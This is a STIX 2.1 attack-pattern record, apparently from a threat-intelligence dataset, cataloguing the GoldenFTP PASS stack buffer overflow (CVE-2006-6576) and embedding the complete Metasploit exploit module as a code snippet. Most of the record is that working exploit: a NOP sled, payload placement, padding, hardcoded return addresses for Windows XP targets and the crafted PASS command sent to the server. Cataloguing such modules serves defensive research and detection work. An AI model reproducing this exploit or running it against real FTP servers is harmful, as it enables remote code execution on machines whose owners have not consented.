{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a405a51-8d50-40cc-955b-af9c59a919ac",
    "created": "2024-08-14T16:50:53.133028Z",
    "modified": "2024-08-14T16:50:53.133032Z",
    "name": "GoldenFTP PASS Stack Buffer Overflow",
    "description": " This module exploits a vulnerability in the Golden FTP service, using the PASS command to cause a buffer overflow.  Please note that in order trigger the vulnerable code, the victim machine must have the \"Show new connections\" setting enabled.  By default, this option is unchecked. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/goldenftp_pass_bof.rb",
            "external_id": "goldenftp_pass_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6576"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GoldenFTP PASS Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Golden FTP service, using the PASS\n        command to cause a buffer overflow.  Please note that in order trigger the vulnerable\n        code, the victim machine must have the \"Show new connections\" setting enabled.  By\n        default, this option is unchecked.\n      },\n      'Author'         =>\n        [\n          'Craig Freyman',  #Initial poc on exploit-db with iglesiasgg\n          'bannedit',  #Initial msf module\n          'Joff Thyer <jsthyer[at]gmail.com>',  #Improved msf version\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-6576'],\n          [ 'OSVDB', '35951'],\n          [ 'BID', '45957'],\n          [ 'EDB', '16036'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 440,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'Windows XP Pro SP3', { 'Ret' => 0x7E45AE4E, } ],     #JMP ESI USER32.dll\n          [ 'Windows XP Pro SP2', { 'Ret' => 0x77D4E23B, } ],     #JMP ESI USER32.dll\n          [ 'Windows XP Pro SP0/SP1', { 'Ret' => 0x77e8157b, } ]  #JMP ESI kernel32.dll\n        ],\n      'DisclosureDate' => '2011-01-23'))\n  end\n\n  def check\n    connect\n    disconnect\n    vprint_status(\"FTP Banner: #{banner}\".strip)\n    if banner =~ /Golden FTP Server ready v(4\\.\\d{2})/ and $1 == \"4.70\"\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    shortjmp = make_nops(3) + \"\\xeb\\x20\"\n    nopsled = make_nops(1) * 60\n    srciplen = Rex::Socket.source_address.length\n    padding = make_nops(1) * (533 - (srciplen + nopsled.length + payload.encoded.length))\n\n    sploit = nopsled\n    sploit << payload.encoded\n    sploit << padding\n    sploit << [target.ret].pack('V')\n\n    print_status(\"Connecting to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n\n    connect\n    raw_send(shortjmp + \"\\n\")\n    send_user(datastore['FTPUSER'])\n    send_cmd(['PASS', sploit], false)\n    select(nil,nil,nil,2)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-23",
    "x_mitre_platforms": [
        "['win']"
    ]
}